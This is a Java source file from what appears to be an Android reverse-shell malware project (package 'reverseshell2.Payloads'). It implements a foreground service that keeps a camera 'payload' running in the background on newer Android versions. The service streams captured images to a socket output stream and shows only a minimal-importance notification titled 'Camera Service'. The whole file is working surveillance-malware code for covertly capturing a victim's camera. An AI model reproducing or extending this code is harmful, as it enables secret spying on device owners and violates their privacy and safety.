package com.example.reverseshell2.Payloads;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

import java.io.OutputStream;

/**
 * Foreground service used to run the camera payload while the app is in the
 * background on Android 11+ / Android 12+.
 *
 * <p>Starting with Android 11 (API 30), a camera foreground-service type exists
 * and, on Android 12 (API 31), the camera can no longer be opened from the
 * background unless an app is running a foreground service declared with
 * {@code android:foregroundServiceType="camera"}. This service does exactly that.
 *
 * <p>Required manifest declaration:
 * <pre>
 * <service
 *     android:name=".Payloads.CameraService"
 *     android:enabled="true"
 *     android:exported="false"
 *     android:foregroundServiceType="camera" />
 * </pre>
 *
 * <p>Start it with:
 * <pre>
 *     CameraService.start(context, cameraId, socketOutputStream);
 * </pre>
 */
public class CameraService extends Service implements CameraPreview.CameraCallback {

    private static final String CHANNEL_ID = "camera_service_channel";
    private static final int NOTIFICATION_ID = 0xCA1E;
    private static final long TIMEOUT_MS = 30_000L;

    private static OutputStream staticStream;
    private static int staticCameraId = 0;

    private final Handler mainHandler = new Handler(Looper.getMainLooper());
    private final Runnable timeoutRunnable = new Runnable() {
        @Override
        public void run() {
            stopSelf();
        }
    };

    /** Starts the camera foreground service. Use this instead of calling CameraPreview directly. */
    public static void start(Context context, int cameraId, OutputStream stream) {
        staticStream = stream;
        staticCameraId = cameraId;
        Intent intent = new Intent(context, CameraService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startAsForeground();
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (staticStream == null) {
            stopSelf();
            return START_NOT_STICKY;
        }

        // Safety net: stop the service if the capture never completes.
        mainHandler.postDelayed(timeoutRunnable, TIMEOUT_MS);

        CameraPreview preview = new CameraPreview(this);
        preview.setCallback(this);
        preview.startUp(staticCameraId, staticStream);

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        mainHandler.removeCallbacks(timeoutRunnable);
        staticStream = null;
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCaptureComplete() {
        stopSelf();
    }

    @Override
    public void onCaptureError(String reason) {
        stopSelf();
    }

    private void startAsForeground() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            // Android 11+: explicitly declare the camera foreground-service type.
            startForeground(NOTIFICATION_ID, buildNotification(),
                    ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA);
        } else {
            // Android 10 and below: the type comes from the manifest attribute.
            startForeground(NOTIFICATION_ID, buildNotification());
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Camera Service", NotificationManager.IMPORTANCE_MIN);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) {
                nm.createNotificationChannel(channel);
            }
        }
    }

    private Notification buildNotification() {
        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, CHANNEL_ID);
        } else {
            builder = new Notification.Builder(this);
        }
        return builder
                .setContentTitle("Camera Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_camera)
                .setOngoing(true)
                .build();
    }
}

